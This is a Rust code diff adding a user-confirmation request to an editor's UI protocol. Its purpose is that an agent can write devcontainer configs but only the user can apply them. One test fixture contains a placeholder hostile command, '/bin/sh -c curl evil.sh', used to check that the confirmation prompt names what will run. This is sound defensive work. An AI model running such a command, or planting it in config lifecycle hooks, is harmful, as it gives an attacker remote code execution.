@@ -38,6 +38,19 @@ pub enum UiRequest {
         path: std::path::PathBuf,
         content: String,
     },
+    /// Ask the user to approve something an agent set in motion.
+    ///
+    /// Applying a devcontainer config runs that config lifecycle commands,
+    /// so an agent able to write `.devcontainer/` *and* apply it has
+    /// arbitrary code execution by another name. This splits authorship
+    /// from application: the agent may write, the user applies. The reply
+    /// is a decision, and a caller that cannot obtain one must fail
+    /// closed.
+    Confirm {
+        title: String,
+        body: String,
+        confirm_label: String,
+    },
 }
 
 #[derive(Debug, Clone)]
@@ -55,6 +68,8 @@ pub enum UiReply {
     /// would strand the user's open buffer showing text the file no
     /// longer has.
     BufferWrite(Result<(), String>),
+    /// The user answer. False covers denied, dismissed, and never asked.
+    Confirm(bool),
     /// The UI could not answer (unknown target, widget not rendered).
     Error(String),
 }
@@ -140,6 +155,30 @@ mod tests {
         }))
         .unwrap();
         assert!(matches!(reply, UiReply::Geometry(_)));
+        responder.join().unwrap();
+    }
+
+    #[test]
+    fn a_confirmation_round_trips() {
+        let probe = UiProbe::new();
+        let requests = probe.requests();
+        let responder = std::thread::spawn(move || {
+            let (request, reply) = requests.recv_blocking().unwrap();
+            let UiRequest::Confirm { body, .. } = request else {
+                panic!("expected a confirmation");
+            };
+            // The prompt must name what is about to run, or approving it
+            // is not consent to anything in particular.
+            assert!(body.contains("curl evil.sh"), "{body}");
+            reply.send_blocking(UiReply::Confirm(true)).unwrap();
+        });
+        let reply = block_on(probe.request(UiRequest::Confirm {
+            title: "Apply devcontainer changes?".into(),
+            body: "On rebuild this will run:\n\n  /bin/sh -c curl evil.sh".into(),
+            confirm_label: "Apply and Rebuild".into(),
+        }))
+        .unwrap();
+        assert!(matches!(reply, UiReply::Confirm(true)));
         responder.join().unwrap();
     }
 
